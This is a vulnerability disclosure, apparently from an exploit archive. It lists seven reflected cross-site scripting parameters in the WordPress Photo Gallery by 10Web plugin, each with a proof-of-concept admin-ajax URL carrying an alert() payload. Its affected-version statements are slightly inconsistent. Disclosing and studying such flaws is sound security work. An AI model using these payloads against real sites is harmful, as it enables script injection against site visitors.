EXP
---

    WordPress Photo Gallery 1.5.69 Cross Site Scripting Vulnerability
    Researcher Name: ThuraMoeMyint
    Twitter: https://twitter.com/mgthuramoemyint
    Vendor Url: https://wordpress.org/plugins/photo-gallery/

    "Photo Gallery by 10Web / Mobile-Friendly Image Gallery" (photo-gallery) Multiple RXSS

    The parameter bwg_album_breadcrumb_0 is able to inject malicious javascript code.
    Affected Version < 1.5.68

    vuln.com/wp-admin/admin-ajax.php?action=bwg_frontend_data&bwg_album_breadcrumb_0=[{"id":"1'><img/src=x onerror=alert(1)>","page":1},{"id":"1","page":1}]&gallery_type=album_extended_preview

    The parameter "shortcode_id" is able to inject malicious javascript.
    Affected Version < 1.5.68

    vuln.com/wp-admin/admin-ajax.php?action=bwg_frontend_data&gallery_type=image_browser&gallery_id=5&tag=0&album_id=0&theme_id=1&shortcode_id=9%22%20onmouseover=alert(id)//

    The parameter "album_gallery_id_0" is able to inject malicious javascript.
    Affected Version <= 1.5.68

    vuln.com/wp-admin/admin-ajax.php?action=bwg_frontend_data&album_gallery_id_0=%27);}%20alert(1);//

    The parameter "bwg_album_search_0" is able to inject malicious javascript.
    Affected Version <= 1.5.68

    vuln.com/wp-admin/admin-ajax.php?action=bwg_frontend_data&bwg_album_search_0=%22%20autofocus%20onfocus%3D%22alert(1)

    The parameter "tag" is able to inject malicious javascript.
    Affected Version <= 1.5.68

    vuln.com/wp-admin/admin-ajax.php?action=bwg_frontend_data&tag=%22%20onmouseover=alert(1)%3E

    The parameter "type_0" is able to inject malicious javascript.
    Affected Version <= 1.5.68

    vuln.com/wp-admin/admin-ajax.php?action=bwg_frontend_data&type_0=%27);}%20alert(document.domain);//

    The parameter "theme_id" is able to inject malicious javascript.
    Affected Version <= 1.5.69

    vuln.com/wp-admin/admin-ajax.php?action=bwg_frontend_data&theme_id=%22%20onmouseover=alert(1)%3E